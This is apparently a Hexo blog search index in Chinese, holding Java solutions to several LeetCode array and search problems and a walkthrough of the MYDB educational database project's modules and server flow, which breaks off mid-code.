<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Daily_Algorithm</title>
    <url>/2022/07/29/Daily-Algorithm/</url>
    <content><![CDATA[<h1 id="每日刷题"><a href="#每日刷题" class="headerlink" title="每日刷题"></a>每日刷题</h1><p>leetcode每日刷题，先定个小目标300</p>
<p><a href="https://github.com/sunzhengyu99/Daily-Algorithm">项目地址</a></p>
<h1 id="高级算法分析与设计课程作业"><a href="#高级算法分析与设计课程作业" class="headerlink" title="高级算法分析与设计课程作业"></a>高级算法分析与设计课程作业</h1><h2 id="作业一"><a href="#作业一" class="headerlink" title="作业一"></a>作业一</h2><h3 id="两数之和（力扣第1题）"><a href="#两数之和（力扣第1题）" class="headerlink" title="两数之和（力扣第1题）"></a>两数之和（力扣第1题）</h3><blockquote>
<p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。</p>
<p>示例:</p>
<p>给定 nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</p>
<p>因为 nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9</p>
<p>所以返回 [0, 1]</p>
<p>来源：力扣（LeetCode）</p>
<p>链接：<a href="https://leetcode-cn.com/problems/two-sum">https://leetcode-cn.com/problems/two-sum</a></p>
</blockquote>
<ul>
<li>思路一：暴力，二重循环搜索答案，肯定超时</li>
<li>思路二：使用hash表，将遍历过的数据放入hash表中，&lt;key , value&gt; 为&lt;nums[i], i&gt;结构</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] twoSum(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target) &#123;
    HashMap&lt;Integer, Integer&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;
        <span class="hljs-keyword">if</span>(map.containsKey(target - nums[i]))&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;map.get(target - nums[i]), i&#125;;
        &#125;
        map.put(nums[i], i);
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
&#125;</code></pre>

<h3 id="最大子序和（力扣53题）"><a href="#最大子序和（力扣53题）" class="headerlink" title="最大子序和（力扣53题）"></a>最大子序和（力扣53题）</h3><blockquote>
<p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>
<p>示例:</p>
<p>输入: [-2,1,-3,4,-1,2,1,-5,4],</p>
<p>输出: 6</p>
<p>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p>
<p>来源：力扣（LeetCode）</p>
<p>链接：<a href="https://leetcode-cn.com/problems/maximum-subarray">https://leetcode-cn.com/problems/maximum-subarray</a></p>
</blockquote>
<p>思路：动态规划</p>
<ul>
<li><p>创建dp数组，dp[i]表示遍历到i时，第 i个数结尾的 连续子数组的最大和</p>
</li>
<li><p>动态转移方程</p>
<pre><code class="hljs inform7">dp<span class="hljs-comment">[i]</span> = max(dp<span class="hljs-comment">[i - 1]</span> + nums<span class="hljs-comment">[i]</span>, nums<span class="hljs-comment">[i]</span>);</code></pre>
</li>
<li><p>初始化dp</p>
<pre><code class="hljs apache"><span class="hljs-attribute">dp</span>[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>]</code></pre>
</li>
<li><p>遍历顺序为从前向后</p>
</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxSubArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;
    <span class="hljs-comment">// int sum = nums[0];</span>
    <span class="hljs-comment">// int[] dp = new int[nums.length];</span>
    <span class="hljs-comment">// dp[0] = nums[0];</span>
    <span class="hljs-comment">// for (int i = 1; i &lt; nums.length; i++) &#123;</span>
    <span class="hljs-comment">//     dp[i] = Math.max(dp[i-1] + nums[i], nums[i]);</span>
    <span class="hljs-comment">//     if(dp[i] &gt; sum)&#123;</span>
    <span class="hljs-comment">//         sum = dp[i];</span>
    <span class="hljs-comment">//     &#125;</span>
    <span class="hljs-comment">// &#125;</span>
    <span class="hljs-comment">// return sum;</span>
    <span class="hljs-comment">// 可以不使用dp数组，节省空间</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> nums[<span class="hljs-number">0</span>];
    <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> sum;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; nums.length; i++) &#123;
        sum = Math.max(sum + nums[i], nums[i]);
        <span class="hljs-keyword">if</span>(sum &gt; result)&#123;
            result = sum;
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> result;
&#125;</code></pre>





<h3 id="多数元素（力扣169题）"><a href="#多数元素（力扣169题）" class="headerlink" title="多数元素（力扣169题）"></a>多数元素（力扣169题）</h3><blockquote>
<p>给定一个大小为 n 的数组，找到其中的多数元素。多数元素是指在数组中出现次数大于 ⌊ n&#x2F;2 ⌋ 的元素。</p>
<p>你可以假设数组是非空的，并且给定的数组总是存在多数元素。</p>
<p>示例 1:</p>
<p>输入: [3,2,3]</p>
<p>输出: 3</p>
<p>示例 2:</p>
<p>输入: [2,2,1,1,1,2,2]</p>
<p>输出: 2</p>
<p>来源：力扣（LeetCode）</p>
<p>链接：<a href="https://leetcode-cn.com/problems/majority-element">https://leetcode-cn.com/problems/majority-element</a></p>
</blockquote>
<ul>
<li>思路一：使用hash表，遍历数组并计数即可</li>
<li>思路二：排序，题中说了总是存在多数元素，那么排序后的弟⌊ n&#x2F;2 ⌋即为所求答案</li>
<li>思路三：从第一个数开始count&#x3D;1，遇到相同的就加1，遇到不同的就减1，减到0就重新换个数开始计数，总能找到最多的那个</li>
</ul>
<pre><code class="hljs java"><span class="hljs-comment">// 思路一</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">majorityElement</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;
    HashMap&lt;Integer, Integer&gt; count = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;
        count.put(nums[i], count.getOrDefault(nums[i], <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);
    &#125;

    Set&lt;Map.Entry&lt;Integer, Integer&gt;&gt; entries = count.entrySet();
    <span class="hljs-keyword">for</span> (Map.Entry&lt;Integer, Integer&gt; entry : entries) &#123;
        <span class="hljs-keyword">if</span>(entry.getValue() &gt; nums.length / <span class="hljs-number">2</span>)&#123;
            <span class="hljs-keyword">return</span> entry.getKey();
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
&#125;
<span class="hljs-comment">// 思路二</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">majorityElement</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;
    Arrays.sort(nums);
    <span class="hljs-keyword">return</span> nums[nums.length / <span class="hljs-number">2</span>];
&#125;
<span class="hljs-comment">// 思路三</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">majorityElement</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;
    <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> nums[<span class="hljs-number">0</span>];
    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; nums.length; i++) &#123;
        <span class="hljs-keyword">if</span>(nums[i] == res)&#123;
            count ++;
        &#125;<span class="hljs-keyword">else</span> &#123;
            count --;
            <span class="hljs-keyword">if</span>(count == <span class="hljs-number">0</span>)&#123;
                res = nums[i + <span class="hljs-number">1</span>];
            &#125;
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> res;
&#125;</code></pre>

<h3 id="二分查找（力扣704题）"><a href="#二分查找（力扣704题）" class="headerlink" title="二分查找（力扣704题）"></a>二分查找（力扣704题）</h3><blockquote>
<p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p>
<p>示例 1:</p>
<p>输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 9</p>
<p>输出: 4</p>
<p>解释: 9 出现在 nums 中并且下标为 4</p>
<p>示例 2:</p>
<p>输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 2</p>
<p>输出: -1</p>
<p>解释: 2 不存在 nums 中因此返回 -1</p>
<p>来源：力扣（LeetCode）</p>
<p>链接：<a href="https://leetcode-cn.com/problems/binary-search-">https://leetcode-cn.com/problems/binary-search-</a></p>
</blockquote>
<p>无需多言</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target)</span> &#123;
    <span class="hljs-keyword">if</span>(nums == <span class="hljs-literal">null</span> || nums.length == <span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    &#125;

    <span class="hljs-type">int</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nums.length - <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> left + (right - left) / <span class="hljs-number">2</span>;
    <span class="hljs-keyword">while</span> (left &lt;= right)&#123;
        <span class="hljs-keyword">if</span>(target &gt; nums[mid])&#123;
            left = mid + <span class="hljs-number">1</span>;
        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target &lt; nums[mid])&#123;
            right = mid -<span class="hljs-number">1</span>;
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> mid;
        &#125;
        mid = left + (right - left) / <span class="hljs-number">2</span>;
    &#125;

    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
&#125;</code></pre>



<h3 id="数组中第k个最大元素（力扣215题）"><a href="#数组中第k个最大元素（力扣215题）" class="headerlink" title="数组中第k个最大元素（力扣215题）"></a>数组中第k个最大元素（力扣215题）</h3><blockquote>
<p>在未排序的数组中找到第 k 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。</p>
<p>示例 1:</p>
<p>输入: [3,2,1,5,6,4] 和 k &#x3D; 2</p>
<p>输出: 5</p>
<p>示例 2:</p>
<p>输入: [3,2,3,1,2,4,5,5,6] 和 k &#x3D; 4</p>
<p>输出: 4</p>
<p>说明:可以假设 k 总是有效的，且 1 ≤ k ≤ 数组的长度</p>
<p>来源：力扣（LeetCode）</p>
<p>链接：<a href="https://leetcode-cn.com/problems/kth-largest-element-in-an-array">https://leetcode-cn.com/problems/kth-largest-element-in-an-array</a></p>
</blockquote>
<p>思路一：优先队列，维护一个容量为k的优先队列（最小堆），其队首元素为最小值，当遍历完整个数组后，队首元素即为第k大的数</p>
<p>思路二：基于快速排序的快速选择算法</p>
<pre><code class="hljs java"><span class="hljs-comment">// 优先队列    </span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">findKthLargest</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> k)</span> &#123;
    <span class="hljs-comment">// 第 1 大的数，下标是 len - 1;</span>
    <span class="hljs-comment">// 第 2 大的数，下标是 len - 2;</span>
    <span class="hljs-comment">// ...</span>
    <span class="hljs-comment">// 第 k 大的数，下标是 len - k;</span>
    <span class="hljs-comment">// 创建优先队列</span>
    <span class="hljs-comment">// 创建一个容量为k的小根堆，那么遍历整个数组的过程中维护这个小根堆，那么其根元素就是数组中第k大的数</span>
    PriorityQueue&lt;Integer&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(k, Comparator.comparingInt(a -&gt; a));
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; k; i++) &#123;
        priorityQueue.offer(nums[i]);
    &#125;

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> k; i &lt; nums.length; i++) &#123;
        <span class="hljs-type">Integer</span> <span class="hljs-variable">peek</span> <span class="hljs-operator">=</span> priori
            tyQueue.peek();
        <span class="hljs-keyword">if</span>(nums[i] &gt; peek)&#123;
            priorityQueue.poll();
            priorityQueue.offer(nums[i]);
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> priorityQueue.peek();
&#125;

<span class="hljs-comment">// 快速选择</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">findKthLargest</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> k)</span> &#123;
    <span class="hljs-comment">// 第 1 大的数，下标是 len - 1;</span>
    <span class="hljs-comment">// 第 2 大的数，下标是 len - 2;</span>
    <span class="hljs-comment">// ...</span>
    <span class="hljs-comment">// 第 k 大的数，下标是 len - k;</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> nums.length;
    <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> len - k;

    <span class="hljs-type">int</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> len - <span class="hljs-number">1</span>;

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;
        <span class="hljs-type">int</span> <span class="hljs-variable">pivotIndex</span> <span class="hljs-operator">=</span> partition(nums, left, right);
        <span class="hljs-keyword">if</span> (pivotIndex == target) &#123;
            <span class="hljs-keyword">return</span> nums[pivotIndex];
        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pivotIndex &lt; target) &#123;
            left = pivotIndex + <span class="hljs-number">1</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-comment">// pivotIndex &gt; target</span>
            right = pivotIndex - <span class="hljs-number">1</span>;
        &#125;
    &#125;
&#125;

<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">partition</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> &#123;
    <span class="hljs-type">int</span> <span class="hljs-variable">randomIndex</span> <span class="hljs-operator">=</span> left + random.nextInt(right - left + <span class="hljs-number">1</span>);
    swap(nums, left, randomIndex);
    <span class="hljs-comment">// all in nums[left + 1..le) &lt;= pivot;</span>
    <span class="hljs-comment">// all in nums(ge..right] &gt;= pivot;</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">pivot</span> <span class="hljs-operator">=</span> nums[left];
    <span class="hljs-type">int</span> <span class="hljs-variable">le</span> <span class="hljs-operator">=</span> left + <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">ge</span> <span class="hljs-operator">=</span> right;

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;
        <span class="hljs-keyword">while</span> (le &lt;= ge &amp;&amp; nums[le] &lt; pivot) &#123;
            le++;
        &#125;

        <span class="hljs-keyword">while</span> (le &lt;= ge &amp;&amp; nums[ge] &gt; pivot) &#123;
            ge--;
        &#125;

        <span class="hljs-keyword">if</span> (le &gt;= ge) &#123;
            <span class="hljs-keyword">break</span>;
        &#125;
        swap(nums, le, ge);
        le++;
        ge--;
    &#125;

    swap(nums, left, ge);
    <span class="hljs-keyword">return</span> ge;
&#125;

<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> index1, <span class="hljs-type">int</span> index2)</span> &#123;
    <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> nums[index1];
    nums[index1] = nums[index2];
    nums[index2] = temp;
&#125;</code></pre>



<h3 id="搜索二维矩阵（力扣240题）"><a href="#搜索二维矩阵（力扣240题）" class="headerlink" title="搜索二维矩阵（力扣240题）"></a>搜索二维矩阵（力扣240题）</h3><blockquote>
<p>编写一个高效的算法来搜索 m x n 矩阵 matrix 中的一个目标值 target。该矩阵具有以下特性：</p>
<p>每行的元素从左到右升序排列。</p>
<p>每列的元素从上到下升序排列。</p>
<p>示例:</p>
<p>现有矩阵 matrix 如下：</p>
<p><em>[</em></p>
<p> <em>[1,  4, 7, 11, 15],</em></p>
<p> <em>[2,  5, 8, 12, 19],</em></p>
<p> <em>[3,  6, 9, 16, 22],</em></p>
<p> <em>[10, 13, 14, 17, 24],</em></p>
<p> <em>[18, 21, 23, 26, 30]</em></p>
<p><em>]</em></p>
<p>给定 target &#x3D; 5，返回 true。</p>
<p>给定 target &#x3D; 20，返回 false。</p>
<p>来源：力扣（LeetCode）</p>
<p>链接：<a href="https://leetcode-cn.com/problems/search-a-2d-matrix-ii">https://leetcode-cn.com/problems/search-a-2d-matrix-ii</a></p>
</blockquote>
<p>思路一：题中说的很清楚是有序的矩阵，可以模仿二分搜索解决该题</p>
<p>思路二：<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220924161450669.png" alt="image-20220924161450669"></p>
<pre><code class="hljs java"><span class="hljs-comment">// 思路一</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">searchMatrix</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] matrix, <span class="hljs-type">int</span> target)</span> &#123;

    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span>[] nums : matrix) &#123;
        <span class="hljs-keyword">if</span>(search(nums, target))&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target)</span> &#123;
    <span class="hljs-keyword">if</span>(nums == <span class="hljs-literal">null</span> || nums.length == <span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    &#125;

    <span class="hljs-type">int</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nums.length - <span class="hljs-number">1</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> left + (right - left) / <span class="hljs-number">2</span>;
    <span class="hljs-keyword">while</span> (left &lt;= right)&#123;
        <span class="hljs-keyword">if</span>(target &gt; nums[mid])&#123;
            left = mid + <span class="hljs-number">1</span>;
        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(target &lt; nums[mid])&#123;
            right = mid -<span class="hljs-number">1</span>;
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        &#125;
        mid = left + (right - left) / <span class="hljs-number">2</span>;
    &#125;

    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;

<span class="hljs-comment">// 思路二</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">searchMatrix</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] matrix, <span class="hljs-type">int</span> target)</span> &#123;
    <span class="hljs-comment">// 从矩阵的右上角搜索 (0, matrix[0].length)</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> matrix[<span class="hljs-number">0</span>].length;
    <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> matrix.length;
    <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> m - <span class="hljs-number">1</span>;
    <span class="hljs-keyword">while</span> (x &lt; n &amp;&amp; y &gt;= <span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">if</span>(target == matrix[x][y])&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target &lt; matrix[x][y]) &#123;
            y --;
        &#125;<span class="hljs-keyword">else</span> &#123;
            x ++;
        &#125;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
&#125;</code></pre>

]]></content>
      <tags>
        <tag>java,algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>MYDB</title>
    <url>/2023/03/25/MYDB/</url>
    <content><![CDATA[<h1 id="MYDB项目的总结"><a href="#MYDB项目的总结" class="headerlink" title="MYDB项目的总结"></a>MYDB项目的总结</h1><p>花了一周从头到尾看了整个项目，在此做个总结，真是太复杂了，实在佩服作者。如果有错误，请指正。</p>
<h2 id="MYDB的每个部分的作用"><a href="#MYDB的每个部分的作用" class="headerlink" title="MYDB的每个部分的作用"></a>MYDB的每个部分的作用</h2><ul>
<li><p>TM 通过维护 XID 文件来维护事务的状态，并提供接口供其他模块来查询某个事务的状态。</p>
</li>
<li><p>DM 直接管理数据库 DB 文件和日志文件。DM 的主要职责有：</p>
<ul>
<li><p>分页管理 DB 文件，并进行缓存；</p>
</li>
<li><p>管理日志文件，保证在发生错误时可以根据日志进行恢复；</p>
</li>
<li><p>抽象 DB 文件为 DataItem 供上层模块使用，并提供缓存。</p>
</li>
</ul>
</li>
<li><p>VM 基于两段锁协议实现了调度序列的可串行化，并实现了 MVCC 以消除读写阻塞。同时实现了两种隔离级别。</p>
</li>
<li><p>IM 实现了基于 B+ 树的索引，BTW，目前 where 只支持已索引字段。</p>
</li>
<li><p>TBM 实现了对字段和表的管理。同时，解析 SQL 语句，并根据语句操作表。</p>
</li>
</ul>
<h2 id="服务端执行流程"><a href="#服务端执行流程" class="headerlink" title="服务端执行流程"></a>服务端执行流程</h2><h3 id="1-创建对底层的tm模块"><a href="#1-创建对底层的tm模块" class="headerlink" title="1.创建对底层的tm模块"></a>1.创建对底层的tm模块</h3><pre><code class="hljs java">TransactionManagerImpl tm= TransactionManager.create(<span class="hljs-string">&quot;cun/tm&quot;</span>);</code></pre>

<p>此时会创建一个tm.xid文件，所有的事务xid存放在此</p>
<h3 id="2-基于tm创建dm模块"><a href="#2-基于tm创建dm模块" class="headerlink" title="2.基于tm创建dm模块"></a>2.基于tm创建dm模块</h3><pre><code class="hljs java">DataManager dm=DataManager.create(<span class="hljs-string">&quot;cun/dm&quot;</span>,<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>,tm);</code></pre>

<p>DataManager创建过程中，会创建PageCache，Logger</p>
<pre><code class="hljs java"><span class="hljs-type">PageCache</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> PageCache.create(path, mem);  
<span class="hljs-type">Logger</span> <span class="hljs-variable">lg</span> <span class="hljs-operator">=</span> Logger.create(path);  
<span class="hljs-comment">// 此时创建了dm.db和dm.log，分别存储数据库数据 和 日志记录</span>
<span class="hljs-type">DataManagerImpl</span> <span class="hljs-variable">dm</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataManagerImpl</span>(pc, lg, tm);  
dm.initPageOne();
<span class="hljs-comment">//并对pageOne进行初始化</span></code></pre>

<h3 id="3-创建VM模块，此处要tm-dm"><a href="#3-创建VM模块，此处要tm-dm" class="headerlink" title="3.创建VM模块，此处要tm,dm"></a>3.创建VM模块，此处要tm,dm</h3><pre><code class="hljs java">VersionManager vm= VersionManager.newVersionManager(tm,dm);</code></pre>

<p>首先会初始化缓存框架中的信息，初始化成员变量，将SUPER_XID(0)加入到活跃事务列表</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">VersionManagerImpl</span><span class="hljs-params">(TransactionManager tm, DataManager dm)</span> &#123;  
    <span class="hljs-built_in">super</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 调用父类AbstractCache的构造方法 初始maxResource</span>
    <span class="hljs-built_in">this</span>.tm = tm;  
    <span class="hljs-built_in">this</span>.dm = dm;  
    <span class="hljs-built_in">this</span>.activeTransaction = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  
    <span class="hljs-comment">// 初始化 活跃事务列表，并将超级事务 就xid为0的</span>
    activeTransaction.put(TransactionManagerImpl.SUPER_XID, Transaction.newTransaction(TransactionManagerImpl.SUPER_XID, <span class="hljs-number">0</span>, <span class="hljs-literal">null</span>));  
    <span class="hljs-built_in">this</span>.lock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  
    <span class="hljs-built_in">this</span>.lt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LockTable</span>();  
&#125;</code></pre>

<h4 id="4-创建TM模块，此处基于VM-DM"><a href="#4-创建TM模块，此处基于VM-DM" class="headerlink" title="4.创建TM模块，此处基于VM,DM"></a>4.创建TM模块，此处基于VM,DM</h4><pre><code class="hljs java">TableManager tbm=TableManager.create(<span class="hljs-string">&quot;cun/&quot;</span>,vm,dm);</code></pre>

<p>创建文件.tb用于存放表信息</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TableManager <span class="hljs-title function_">create</span><span class="hljs-params">(String path, VersionManager vm, DataManager dm)</span> &#123;  
    <span class="hljs-type">Booter</span> <span class="hljs-variable">booter</span> <span class="hljs-operator">=</span> Booter.create(path);  
    booter.update(Parser.long2Byte(<span class="hljs-number">0</span>));  
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableManagerImpl</span>(vm, dm, booter);  
&#125;</code></pre>

<h3 id="5-开启事务"><a href="#5-开启事务" class="headerlink" title="5.开启事务"></a>5.开启事务</h3><pre><code class="hljs java">BeginRes br=tbm.begin(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>());</code></pre>


<h3 id="6-解析SQL语句"><a href="#6-解析SQL语句" class="headerlink" title="6.解析SQL语句"></a>6.解析SQL语句</h3><pre><code class="hljs java"><span class="hljs-type">long</span> xid=br.xid;  
<span class="hljs-comment">//建立一张新表  </span>
String ss=<span class="hljs-string">&quot;create table students &quot;</span> +  
        <span class="hljs-string">&quot;name string,age int32 &quot;</span> +  
        <span class="hljs-string">&quot;(index name age)&quot;</span>;  
<span class="hljs-type">byte</span> b[]=ss.getBytes(StandardCharsets.UTF_8);  
<span class="hljs-type">Object</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> Parser.Parse(b);</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230324174126.png"><br>可以看到，解析后会返回一个Object对象，其包含了表名，字段名，字段类型以及索引</p>
<h3 id="7-执行创建表的SQL语句"><a href="#7-执行创建表的SQL语句" class="headerlink" title="7.执行创建表的SQL语句"></a>7.执行创建表的SQL语句</h3><p>分为四种情况<br>     开启一个事务sql语句为 begin<br>     提交一个事务sql语句为 commit<br>     回滚事务sql语句为abort<br>     其他sql语句 CRUD</p>
<blockquote>
<p>MYDB执行sql时，默认是开启事务的，即一条sql语句也是需要提交事务的，也开启手动即begin，保持多个操作的原子性</p>
</blockquote>
<pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> Parser.Parse(sql);  
<span class="hljs-keyword">if</span>(Begin.class.isInstance(stat)) &#123;  
    <span class="hljs-keyword">if</span>(xid != <span class="hljs-number">0</span>) &#123;  
        <span class="hljs-keyword">throw</span> Error.NestedTransactionException;  
    &#125;  
    <span class="hljs-type">BeginRes</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> tbm.begin((Begin)stat);  
    xid = r.xid;  
    <span class="hljs-keyword">return</span> r.result;  
&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(Commit.class.isInstance(stat)) &#123;  
    <span class="hljs-keyword">if</span>(xid == <span class="hljs-number">0</span>) &#123;  
        <span class="hljs-keyword">throw</span> Error.NoTransactionException;  
    &#125;  
    <span class="hljs-type">byte</span>[] res = tbm.commit(xid);  
    xid = <span class="hljs-number">0</span>;  
    <span class="hljs-keyword">return</span> res;  
&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(Abort.class.isInstance(stat)) &#123;  
